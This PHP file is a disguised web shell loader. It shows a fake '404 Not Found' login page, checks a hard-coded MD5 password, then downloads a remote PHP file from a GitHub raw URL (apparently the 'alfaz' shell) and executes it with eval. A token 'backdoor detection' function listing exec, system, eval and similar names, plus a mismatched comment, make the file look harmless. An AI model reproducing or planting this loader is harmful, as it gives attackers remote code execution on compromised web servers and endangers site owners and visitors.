<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '08a5816ec574ddbbeb7f66cf11ce5c3e'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "<script>alert('Incorrect password. Please try again.');</script>";
    }
}

// Function to check PHP file content
function check_php_file($file_content) {
    // Add your backdoor detection logic here
    // For simplicity, we'll just search for common backdoor function names
    $suspicious_functions = ['exec', 'shell_exec', 'system', 'passthru', 'eval', 'base64_decode'];
    foreach ($suspicious_functions as $function) {
        if (strpos($file_content, $function) !== false) {
            return "Suspicious function $function found.";
        }
    }
    return "No suspicious functions found.";
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    if (isset($_FILES['phpfile'])) {
        $file_content = file_get_contents($_FILES['phpfile']['tmp_name']);
        $check_result = check_php_file($file_content);
        echo "<script>alert('$check_result');</script>";
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/refs/heads/main/alfaz.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
<html>
<head>
<title>404 Not Found</title>
<meta name="theme-color" content="#00BFFF">
<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
<style>
    body {
        background-image: url("https://i.gifer.com/76cI.gif");
        background-repeat: no-repeat;
        background-size: contain;
        background-attachment: fixed;
        background-position: center;
        height: 100vh;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: black;
        font-family: 'Orbitron', sans-serif;
        overflow: hidden;
    }

    h1 {
        color: #00BFFF;
        font-size: 3em;
        margin-bottom: 20px;
        text-shadow: 0 0 10px #00BFFF;
    }

    form {
        background: rgba(0, 0, 0, 0.8);
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
        text-align: center;
        animation: fadeIn 2s;
    }

    input[type="password"] {
        padding: 10px;
        border: none;
        border-radius: 5px;
        margin-bottom: 10px;
        width: 80%;
        box-sizing: border-box;
        font-family: 'Orbitron', sans-serif;
    }

    input[type="submit"] {
        background-color: #00BFFF;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        font-family: 'Orbitron', sans-serif;
    }

    input[type="submit"]:hover {
        background-color: #008CBA;
    }

    .container {
        text-align: center;
        color: #00BFFF;
    }

    @media screen and (max-width: 768px) {
        h1 {
            font-size: 2em;
        }

        form {
            width: 90%;
            padding: 10px;
        }

        input[type="password"] {
            width: 90%;
        }

        input[type="submit"] {
            width: 90%;
        }
    }

    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }
</style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form method="POST" action="">
            <input type="password" id="password" name="password" placeholder="Enter Password">
            <input type="submit" value="Tailaso">
        </form>
    </div>
</body>
</html>

    <?php
    exit;
}
